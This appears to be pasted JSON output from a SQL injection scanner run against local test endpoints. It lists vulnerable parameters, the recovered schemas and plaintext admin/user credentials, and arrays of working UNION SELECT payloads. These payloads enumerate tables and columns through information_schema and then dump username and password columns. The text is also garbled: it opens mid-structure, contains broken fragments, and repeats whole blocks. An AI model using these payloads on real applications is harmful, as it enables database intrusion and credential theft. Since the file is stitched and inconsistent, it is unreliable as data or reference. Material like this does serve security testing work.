  ],

      ],
      "data": [
        "0, 456134",
        "2, 123",
        "3, 456"
      ]
    },
    {

      "columns": [
        "id",
        "username",
        "password",
        "description"
      ],
      "data": [
        "1, admin, admin, description user",
        "2, user, user, user description"
      ]
    }
  ],
  "nbColumns": 2,
  "rows": [],

      "user": "1"

    " UNION SELECT null, null, column_name FROM information_schema.columns WHERE table_name = 'users' -- ",
    " UNION SELECT CONCAT(id, ', ', emptything) FROM table_test -- ",
    " UNION SELECT null, CONCAT(id, ', ', emptything), null FROM table_test -- ",
    " UNION SELECT CONCAT(id, ', ', username, ', ', password, ', ', description) FROM users -- ",
    " UNION SELECT null, CONCAT(id, ', ', username, ', ', password, ', ', description), null FROM users -- "
  ]

Test URL : http://localhost:3000/postgres
"Request type: POST"
{
  "dbEngine": "postgresql",
  "dbName": "testdb",
  "table": [
    "users",
    "test_db"
  ],
  "columns": [
    {
      "tableName": "users",
      "columns": [
        "id",
        "description",
        "password",
        "username"
      ],
      "data": [
        "2, user descption here, user, user",
        "1, description admin blabla, admin, admin"
      ]
    },
    {
      "tableName": "test_db",
      "columns": [
        "blibli",
        "bloublou",
        "blabla",
        "id"
      ],
      "data": [
        "111, blablabal, 0, 2",
        "456, , 123, 1"
      ]
    }
  ],
  "nbColumns": 3,
  "rows": [],
  "vulnerableParameters": [
    {
      "field": "username"
    }
  ],
  "payloadsUsed": [
    "' UNION SELECT null, null, null, current_database() -- '",
    "' UNION SELECT null, null, null, table_name FROM information_schema.tables WHERE table_schema = 'public' -- ' ",
    "' UNION SELECT null, null, null, column_name FROM information_schema.columns WHERE table_name = 'users' -- '",
    "' UNION SELECT null, null, null, column_name FROM information_schema.columns WHERE table_name = 'test_db' -- '",
    "' UNION SELECT null, null, CONCAT(CAST(id AS text), ', ', CAST(description AS text), ', ', CAST(password AS text), ', ', CAST(username AS text)), null FROM users -- ",
    "' UNION SELECT null, null, CONCAT(CAST(blibli AS text), ', ', CAST(bloublou AS text), ', ', CAST(blabla AS text), ', ', CAST(id AS text)), null FROM test_db -- "
  ]
}

  ],

    {
      "tableName": "table_test",
      "columns": [
        "id",
        "emptything"
      ],
      "data": [
        "0, 456134",
        "2, 123",
        "3, 456"
      ]
    },
    {
      "tableName": "users",
      "columns": [
        "id",
        "username",
        "password",
        "description"
      ],
      "data": [
        "1, admin, admin, description user",
        "2, user, user, user description"
      ]
    }
  ],
  "nbColumns": 2,
  "rows": [],
  "vulnerableParameters": [
    {
      "user": "1"
    }
  ],
  "payloadsUsed": [
    "'",
    " UNION SELECT null, null, database() -- ",
    " UNION SELECT null, null, table_name FROM information_schema.tables WHERE table_schema = 'testdb' -- ",
    " UNION SELECT null, null, column_name FROM information_schema.columns WHERE table_name = 'table_test' -- ",
    " UNION SELECT null, null, column_name FROM information_schema.columns WHERE table_name = 'users' -- ",
    " UNION SELECT CONCAT(id, ', ', emptything) FROM table_test -- ",
    " UNION SELECT null, CONCAT(id, ', ', emptything), null FROM table_test -- ",
    " UNION SELECT CONCAT(id, ', ', username, ', ', password, ', ', description) FROM users -- ",
    " UNION SELECT null, CONCAT(id, ', ', username, ', ', password, ', ', description), null FROM users -- "
  ]
}

Test URL : http://localhost:3000/postgres
"Request type: POST"
{
  "dbEngine": "postgresql",
  "dbName": "testdb",
  "table": [
    "users",
    "test_db"
  ],
  "columns": [
    {
      "tableName": "users",
      "columns": [
        "id",
        "description",
        "password",
        "username"
      ],
      "data": [
        "2, user descption here, user, user",
        "1, description admin blabla, admin, admin"
      ]
    },
    {
      "tableName": "test_db",
      "columns": [
        "blibli",
        "bloublou",
        "blabla",
        "id"
      ],
      "data": [
        "111, blablabal, 0, 2",
        "456, , 123, 1"
      ]
    }
  ],
  "nbColumns": 3,
  "rows": [],
  "vulnerableParameters": [
    {
      "field": "username"
    }
  ],
  "payloadsUsed": [
    "' UNION SELECT null, null, null, current_database() -- '",
    "' UNION SELECT null, null, null, table_name FROM information_schema.tables WHERE table_schema = 'public' -- ' ",
    "' UNION SELECT null, null, null, column_name FROM information_schema.columns WHERE table_name = 'users' -- '",
    "' UNION SELECT null, null, null, column_name FROM information_schema.columns WHERE table_name = 'test_db' -- '",
    "' UNION SELECT null, null, CONCAT(CAST(id AS text), ', ', CAST(description AS text), ', ', CAST(password AS text), ', ', CAST(username AS text)), null FROM users -- ",
    "' UNION SELECT null, null, CONCAT(CAST(blibli AS text), ', ', CAST(bloublou AS text), ', ', CAST(blabla AS text), ', ', CAST(id AS text)), null FROM test_db -- "
  ]
}
